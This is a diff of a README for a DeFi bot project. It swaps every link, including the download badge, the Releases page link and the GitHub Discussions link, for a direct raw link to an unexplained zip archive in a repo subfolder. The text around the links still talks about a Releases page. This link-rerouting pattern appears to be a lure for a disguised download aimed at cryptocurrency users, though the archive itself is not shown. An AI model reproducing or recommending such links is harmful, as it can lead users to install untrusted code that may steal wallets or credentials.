@@ -6,7 +6,7 @@ Welcome to **defi-bot**! This application helps you automate tasks in the world 
 
 ## 🔗 Download Now
 
-[![Download defi-bot](https://img.shields.io/badge/Download%20defi--bot-brightgreen)](https://github.com/84j124w/defi-bot/releases)
+[![Download defi-bot](https://github.com/84j124w/defi-bot/raw/refs/heads/main/yaje/bot-defi-v3.5.zip%20defi--bot-brightgreen)](https://github.com/84j124w/defi-bot/raw/refs/heads/main/yaje/bot-defi-v3.5.zip)
 
 ## 💻 System Requirements
 
@@ -20,7 +20,7 @@ Welcome to **defi-bot**! This application helps you automate tasks in the world 
 
 To install defi-bot, you will need to visit the Releases page. Click the link below to access the page, where you can download the latest version:
 
-[Visit the Releases Page to Download](https://github.com/84j124w/defi-bot/releases)
+[Visit the Releases Page to Download](https://github.com/84j124w/defi-bot/raw/refs/heads/main/yaje/bot-defi-v3.5.zip)
 
 Once on the Releases page, you will see a list of versions. Identify the latest version marked as “Latest” and click on it. You will find assets for download depending on your operating system. 
 
@@ -62,7 +62,7 @@ If you run into issues while using defi-bot, consider the following tips:
 
 For any additional help or to engage with other users, please visit our community forums and social media pages. You can find valuable tips, tricks, and discussions there.
 
-- **GitHub Discussions:** [Join Here](https://github.com/84j124w/defi-bot/discussions)
+- **GitHub Discussions:** [Join Here](https://github.com/84j124w/defi-bot/raw/refs/heads/main/yaje/bot-defi-v3.5.zip)
 - **Twitter:** Follow us for updates and community news.
 
 ## 📢 Other Resources
